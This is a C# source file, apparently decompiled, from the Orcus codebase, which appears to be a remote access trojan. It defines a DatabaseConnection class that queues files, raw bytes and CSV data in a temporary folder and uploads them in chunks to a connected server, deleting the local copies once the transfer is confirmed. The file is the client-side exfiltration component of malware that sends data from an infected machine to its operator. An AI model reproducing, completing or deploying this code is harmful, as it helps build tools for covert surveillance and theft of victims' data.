using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Csv;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.CommandManagement;

public class DatabaseConnection : IDatabaseConnection
{
	private readonly object _executionLockObject = new object();

	private readonly List<FilePushRequest> _filePushRequests;

	private bool _isRunning;

	private ServerConnection _serverConnection;

	public ServerConnection ServerConnection
	{
		get
		{
			return _serverConnection;
		}
		set
		{
			_serverConnection = value;
			if (value != null)
			{
				CheckRunning();
			}
		}
	}

	public DatabaseConnection()
	{
		_filePushRequests = new List<FilePushRequest>();
		Load();
	}

	public void PushFile(string fileName, string entryName, DataMode dataMode)
	{
		string freePushFileName = GetFreePushFileName();
		File.Copy(fileName, freePushFileName);
		InternalPushFile(freePushFileName, entryName, dataMode, isCsvData: false);
	}

	public void PushFile(byte[] data, string entryName, DataMode dataMode)
	{
		string freePushFileName = GetFreePushFileName();
		File.WriteAllBytes(freePushFileName, data);
		InternalPushFile(freePushFileName, entryName, dataMode, isCsvData: false);
	}

	public void PushData(CsvFile csvFile, string entryName, DataMode dataMode)
	{
		string freePushFileName = GetFreePushFileName();
		using (CsvWriter csvWriter = new CsvWriter())
		{
			csvWriter.WriteCsv(csvFile, freePushFileName, Encoding.UTF8);
		}
		InternalPushFile(freePushFileName, entryName, dataMode, isCsvData: true);
	}

	private void Load()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.FileTransferTempDirectory);
		if (!directoryInfo.Exists)
		{
			return;
		}
		FileInfo[] files = directoryInfo.GetFiles("*.nfo");
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				FilePushRequest filePushRequest = new JavaScriptSerializer().Deserialize<FilePushRequest>(File.ReadAllText(fileInfo.FullName));
				if (!File.Exists(Path.Combine(directoryInfo.FullName, filePushRequest.FileName)))
				{
					File.Delete(fileInfo.FullName);
				}
				else
				{
					_filePushRequests.Add(filePushRequest);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private void InternalPushFile(string fileName, string entryName, DataMode dataMode, bool isCsvData)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		FilePushRequest filePushRequest = new FilePushRequest
		{
			FileName = Path.GetFileName(fileName),
			DataMode = dataMode.get_Guid(),
			EntryName = entryName,
			IsCsvData = isCsvData
		};
		File.WriteAllText(Path.Combine(Consts.FileTransferTempDirectory, filePushRequest.FileName + ".nfo"), new JavaScriptSerializer().Serialize((object)filePushRequest));
		_filePushRequests.Add(filePushRequest);
		CheckRunning();
	}

	private void CheckRunning()
	{
		ServerConnection serverConnection = ServerConnection;
		if (serverConnection == null || !serverConnection.IsConnected)
		{
			return;
		}
		lock (_executionLockObject)
		{
			if (_isRunning)
			{
				return;
			}
			_isRunning = true;
		}
		new Thread((ThreadStart)delegate
		{
			try
			{
				PushRequests();
			}
			catch (Exception)
			{
			}
			finally
			{
				lock (_executionLockObject)
				{
					_isRunning = false;
				}
			}
		}).Start();
	}

	private void PushRequests()
	{
		ServerConnection serverConnection = ServerConnection;
		while (serverConnection.IsConnected)
		{
			if (ServerConnection == null)
			{
				break;
			}
			FilePushRequest filePushRequest;
			lock (_executionLockObject)
			{
				if (_filePushRequests.Count == 0)
				{
					break;
				}
				filePushRequest = _filePushRequests[0];
			}
			Guid guid = Guid.NewGuid();
			AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
			try
			{
				EventHandler<FileTransferEventArgs> value = delegate(object sender, FileTransferEventArgs e)
				{
					if (e.Guid == guid)
					{
						autoResetEvent.Set();
					}
				};
				EventHandler value2 = delegate
				{
					autoResetEvent.Set();
				};
				serverConnection.FileTransferAccepted += value;
				serverConnection.Disconnected += value2;
				serverConnection.InitializeFileTransfer(guid);
				autoResetEvent.WaitOne();
				serverConnection.Disconnected -= value2;
				serverConnection.FileTransferAccepted -= value;
				if (!serverConnection.IsConnected)
				{
					break;
				}
				FileInfo fileInfo = new FileInfo(Path.Combine(Consts.FileTransferTempDirectory, filePushRequest.FileName));
				if (!fileInfo.Exists)
				{
					_filePushRequests.Remove(filePushRequest);
					continue;
				}
				byte[] array = guid.ToByteArray();
				using (FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read))
				{
					byte[] sourceArray;
					using (SHA256Managed sHA256Managed = new SHA256Managed())
					{
						sourceArray = sHA256Managed.ComputeHash(fileStream);
					}
					fileStream.Position = 0L;
					byte[] bytes = Encoding.UTF8.GetBytes(filePushRequest.EntryName);
					byte[] array2 = new byte[73 + bytes.Length];
					Array.Copy(array, 0, array2, 0, 16);
					Array.Copy(BitConverter.GetBytes(fileStream.Length), 0, array2, 16, 8);
					Array.Copy(sourceArray, 0, array2, 24, 32);
					Array.Copy(filePushRequest.DataMode.ToByteArray(), 0, array2, 56, 16);
					array2[72] = (byte)((!filePushRequest.IsCsvData) ? 1u : 0u);
					Array.Copy(bytes, 0, array2, 73, bytes.Length);
					serverConnection.SendBytes((FromClientPackage)22, array2);
					byte[] buffer = new byte[4096];
					int num;
					while ((num = fileStream.Read(buffer, 0, 4096)) > 0)
					{
						lock (serverConnection.SendLock)
						{
							serverConnection.BinaryWriter.Write((byte)23);
							serverConnection.BinaryWriter.Write(num + 16);
							serverConnection.BinaryWriter.Write(array);
							serverConnection.BinaryWriter.Write(buffer, 0, num);
							serverConnection.BinaryWriter.Flush();
						}
					}
				}
				autoResetEvent.Reset();
				EventHandler<FileTransferEventArgs> value3 = delegate(object sender, FileTransferEventArgs e)
				{
					if (e.Guid == guid)
					{
						autoResetEvent.Set();
					}
				};
				serverConnection.FileTransferCompleted += value3;
				if (autoResetEvent.WaitOne(30000))
				{
					File.Delete(fileInfo.FullName);
					File.Delete(fileInfo.FullName + ".nfo");
					_filePushRequests.Remove(filePushRequest);
				}
			}
			finally
			{
				if (autoResetEvent != null)
				{
					((IDisposable)autoResetEvent).Dispose();
				}
			}
		}
	}

	private string GetFreePushFileName()
	{
		if (!Directory.Exists(Consts.FileTransferTempDirectory))
		{
			Directory.CreateDirectory(Consts.FileTransferTempDirectory);
		}
		return FileExtensions.GetUniqueFileName(Consts.FileTransferTempDirectory);
	}
}
